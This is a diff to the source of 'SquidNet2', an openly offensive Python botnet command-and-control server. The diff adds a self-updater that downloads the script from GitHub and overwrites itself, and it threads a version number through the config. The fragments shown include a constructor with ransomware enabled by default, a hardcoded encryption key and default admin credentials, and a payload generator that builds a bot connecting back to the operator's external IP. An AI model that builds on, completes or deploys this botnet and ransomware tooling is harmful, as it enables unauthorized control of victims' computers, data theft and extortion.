@@ -1,4 +1,4 @@
-import socket, threading, hashlib, os, datetime, time, sqlite3, shutil
+import socket, threading, hashlib, os, datetime, time, sqlite3, shutil, urllib.request, json, sys
 
 class BotNet:
     """Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
@@ -34,12 +34,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________         ________     _______   
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \    \   _  \  
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <    /  /_\  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \   \  \_/   \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ \_____  /
-        \/    |__|             \/ || ||  \/     \/             \/              \/  \/       \/ 
+  _________            .__    .||_||_||__          __  ________         ________       .________
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \      |   ____/
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <      |____  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \     /       \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ /______  /
+        \/    |__|             \/ || ||  \/     \/             \/              \/  \/        \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -55,7 +55,7 @@ class BotNet:
 Advanced Botnet By DrSquid
         """
         return logo
-    def __init__(self, ip, port, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True):
+    def __init__(self, ip, port, version, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True):
         """Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
         as it has the definitions of all of the important variables needed for functionality, and also for specification 
         of different things. Many things are defined here, such as the socket that will be used to handle all of the connections, 
@@ -89,7 +89,7 @@ Advanced Botnet By DrSquid
         self.conf_dbfile()
         file = open(self.logfile, "w").close()
         self.log(self.logo())
-        self.version = 2.0
+        self.version = version
         if self.external_ip is None:
             self.external_ip = self.ip
         if self.external_port is None:
@@ -4514,9 +4514,50 @@ bot = Bot('"""+self.external_ip+"""',"""+str(self.external_port)+""", """+str(se
 bot.initiate_connection()
         """
         return payload
+class AutoUpdate:
+    def __init__(self):
+        self.version = 3.5
+    def check_update(self):
+        print(BotNet.logo(None))
+        print("[+] Checking for updates.....")
+        version = self.version - 1.0
+        updated = False
+        try:
+            req = urllib.request.Request(url="https://raw.githubusercontent.com/DrSquidX/SquidNet2/main/SquidNet2Version.json")
+            recv = urllib.request.urlopen(req).read().decode()
+            version_info = open("SquidNet2Version.json","w")
+            version_info.write(recv)
+            version_info.close()
+            json_info = json.load(open(version_info.name,"r"))
+            version = float(json_info[0]["SquidNet2"])
+        except:
+            print("[+] There was an error with checking updates, starting SquidNet2.")
+        if version > self.version:
+            print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}")
+            update = input("\n[+] Do you wish to update?(y/n): ").lower()
+            if update == "y" or update == "yes":
+                print(f"[+] Updating SquidNet2 to v{version}")
+                updated = True
+                req = urllib.request.Request(url="https://raw.githubusercontent.com/DrSquidX/SquidNet2/main/MainScripts/SquidNet2.py")
+                resp = urllib.request.urlopen(req).read()
+                file = open(sys.argv[0],"wb")
+                file.write(resp)
+                file.close()
+            else:
+                print("[+] Choosing not to update.")
+        if not updated:
+            if sys.platform == "win32":
+                os.system("cls")
+            else:
+                os.system("clear")
+            Squidnet = Config(self.version)
+            Squidnet.read_config()
+        else:
+            print("[+] Restart the Script to have the Update be effective!")
 class Config:
     """Class needed for using the config file."""
-    def __init__(self):
+    def __init__(self, version):
+        self.version = version
         self.config_file = "server.config"
     def read_config(self):
         """The config file is read here, where the variables that are in the file are used for the main server."""
@@ -4548,7 +4589,7 @@ class Config:
                         ransomware_active = False
                     else:
                         ransomware_active = True
-            Squidnet = BotNet(hostip, hostport, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir, ransomware_active)
+            Squidnet = BotNet(hostip, hostport, self.version, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir, ransomware_active)
             Squidnet.start()
         except Exception as e:
             self.gen_config_file()
@@ -4573,5 +4614,5 @@ ransomware_active = f
         file.write(gen_content)
         file.close()
         print("[+] The Config file has been reformatted and is now usable by the server! Restart the script to start the server.")
-Squidnet = Config()
-Squidnet.read_config()
+item = AutoUpdate()
+item.check_update()
